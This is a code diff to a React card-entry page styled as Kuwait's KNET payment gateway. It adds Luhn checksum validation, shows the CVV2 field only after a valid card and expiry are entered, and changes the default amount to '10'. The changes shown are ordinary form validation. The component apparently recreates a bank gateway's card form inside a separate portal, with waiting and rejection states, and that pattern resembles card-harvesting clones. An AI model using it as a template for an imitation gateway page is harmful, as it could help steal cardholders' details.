@@ -36,6 +36,7 @@ export default function KNETPayment() {
   const [countdown, setCountdown] = useState(180);
   const countdownRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
+  const [cardError, setCardError] = useState("");
   const [validationError, setValidationError] = useState("");
   const [isWaiting, setIsWaiting] = useState(false);
   const [rejectedError, setRejectedError] = useState("");
@@ -43,7 +44,7 @@ export default function KNETPayment() {
   const [errorModalMessage, setErrorModalMessage] = useState("");
 
   const mohData = JSON.parse(localStorage.getItem("mohPaymentData") || "{}");
-  const totalAmount = mohData.totalAmount || localStorage.getItem("Total") || "0.00";
+  const totalAmount = mohData.totalAmount || localStorage.getItem("Total") || "10";
 
   const paymentUniqueNumber = useRef(
     "PORTALTP" + Date.now().toString().slice(-12)
@@ -143,8 +144,25 @@ export default function KNETPayment() {
     }
   });
 
+  const luhnCheck = (num: string): boolean => {
+    const clean = num.replace(/\s+/g, "");
+    if (!clean || clean.length < 13 || clean.length > 19) return false;
+    let sum = 0;
+    let isEven = false;
+    for (let i = clean.length - 1; i >= 0; i--) {
+      let digit = parseInt(clean[i], 10);
+      if (isEven) { digit *= 2; if (digit > 9) digit -= 9; }
+      sum += digit;
+      isEven = !isEven;
+    }
+    return sum % 10 === 0;
+  };
+
+  const showCvvField = cardNumber.length >= 13 && luhnCheck(cardNumber) && expiryMonth !== "" && expiryYear !== "";
+  const canSubmit = showCvvField && cvv.length >= 3;
+
   const validateCardForm = (): boolean => {
-    if (!cardNumber || cardNumber.length < 13) {
+    if (!cardNumber || !luhnCheck(cardNumber)) {
       setValidationError("Please enter a valid card number");
       return false;
     }
@@ -363,8 +381,8 @@ export default function KNETPayment() {
                       </div>
                     </div>
 
-                    {/* CVV2 */}
-                    <div style={{ display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 20 }}>
+                    {/* CVV2 - only show when card + month + year filled */}
+                    {showCvvField && <div style={{ display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 20 }}>
                       <label style={{ width: 120, fontSize: 13, fontWeight: "bold", color: "#333", textAlign: "right", paddingRight: 10, flexShrink: 0 }}>
                         CVV2
                       </label>
@@ -402,7 +420,7 @@ export default function KNETPayment() {
                           </svg>
                         </button>
                       </div>
-                    </div>
+                    </div>}
 
                     {/* Terms */}
                     <p style={{ fontSize: 12, color: "#444", lineHeight: 1.6, margin: "0 0 20px", textAlign: "center" }}>
@@ -420,7 +438,8 @@ export default function KNETPayment() {
                       <div style={{ display: "flex", gap: 10 }}>
                         <button
                           type="submit"
-                          style={{ background: (cardNumber.length >= 13 && expiryMonth && expiryYear && cvv.length >= 3) ? "#4a0028" : "#d9d9d9", color: (cardNumber.length >= 13 && expiryMonth && expiryYear && cvv.length >= 3) ? "#fff" : "#333", border: "none", borderRadius: 5, padding: "10px 28px", fontSize: 14, cursor: "pointer", fontFamily: "inherit" }}
+                          disabled={!canSubmit}
+                          style={{ background: canSubmit ? "#4a0028" : "#d9d9d9", color: canSubmit ? "#fff" : "#333", border: "none", borderRadius: 5, padding: "10px 28px", fontSize: 14, cursor: canSubmit ? "pointer" : "not-allowed", fontFamily: "inherit" }}
                         >
                           Continue
                         </button>
